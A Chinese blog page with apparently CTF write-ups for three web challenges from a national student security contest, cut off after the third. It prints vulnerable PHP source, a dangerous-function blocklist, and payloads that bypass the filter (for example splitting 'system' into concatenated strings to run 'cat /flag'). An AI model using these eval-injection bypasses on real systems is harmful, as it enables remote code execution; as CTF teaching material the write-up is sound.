<!DOCTYPE html>
<html lang="zh">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="fe1w0">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="fe1w0">
    
    <meta name="keywords" content="fe1w0,fe1w0,fe1w0-blog">
    
    <meta name="description" content="">
    <meta name="description" content="第十三届全国大学生信息安全竞赛-创新实践能力赛webfork12345678910111213141516171819&lt;?php    &#x2F;&#x2F;题目环境：php:7.4.8-apache    $pid &#x3D; pcntl_fork();    if ($pid &#x3D;&#x3D; -1) &amp;#123;        die(&amp;#x27;could not fork&amp;#x27;);    &amp;#125;else i">
<meta property="og:type" content="article">
<meta property="og:title" content="20208月到9月初的wp合集">
<meta property="og:url" content="https://fe1w0.github.io/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/index.html">
<meta property="og:site_name" content="fe1w0">
<meta property="og:description" content="第十三届全国大学生信息安全竞赛-创新实践能力赛webfork12345678910111213141516171819&lt;?php    &#x2F;&#x2F;题目环境：php:7.4.8-apache    $pid &#x3D; pcntl_fork();    if ($pid &#x3D;&#x3D; -1) &amp;#123;        die(&amp;#x27;could not fork&amp;#x27;);    &amp;#125;else i">
<meta property="og:locale">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/1.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/qqqqq.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200914001035019.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200830151854457.png">
<meta property="og:image" content="http://ximg.linkedbyx.com/42f2024636d403ae1f505d3298cc51bd.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200911170301301.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200905194917545.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200906005257430.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200801100818551.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200802120506954.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200802115339682.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200802120506954.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/image-20200803062207187.png">
<meta property="og:image" content="http://img.xzaslxr.xyz/img/1231231231231.png">
<meta property="article:published_time" content="2020-09-12T07:05:07.000Z">
<meta property="article:modified_time" content="2021-03-14T16:19:26.821Z">
<meta property="article:author" content="fe1w0">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="web">
<meta property="article:tag" content="misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://img.xzaslxr.xyz/img/1.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    
    <title>20208月到9月初的wp合集 · fe1w0_blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/favicon.jpg" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
<meta name="generator" content="Hexo 5.2.0"></head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >follow my dream</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">20208月到9月初的wp合集</a>
            </div>
    </div>
    
    <a class="home-link" href=/>follow my dream</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/user/erondu)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            20208月到9月初的wp合集
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "misc">misc</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">17.5k</span>阅读时长: <span class="post-count reading-time">96 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2020/09/12</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <h1 id="第十三届全国大学生信息安全竞赛-创新实践能力赛"><a href="#第十三届全国大学生信息安全竞赛-创新实践能力赛" class="headerlink" title="第十三届全国大学生信息安全竞赛-创新实践能力赛"></a>第十三届全国大学生信息安全竞赛-创新实践能力赛</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);  <span class="comment">// pcntl_wifexited 等待或返回fork的子进程状态</span></span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;  </span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://eci-2ze9505q64pi1umrxpn7.cloudeci1.ichunqiu.com/?a=call_user_func&amp;b=pcntl_wait</span></span><br></pre></td></tr></table></figure>

<h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/173991">https://www.anquanke.com/post/id/173991</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4471">https://xz.aliyun.com/t/4471</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.$val.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.$ifstr.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?a=&#123;<span class="keyword">if</span>:var_dump((<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;cat /flag&#x27;</span>))&#125;a&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p><a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10747">CVE-2019-10747</a>,此题使用的是有问题的版本。</p>
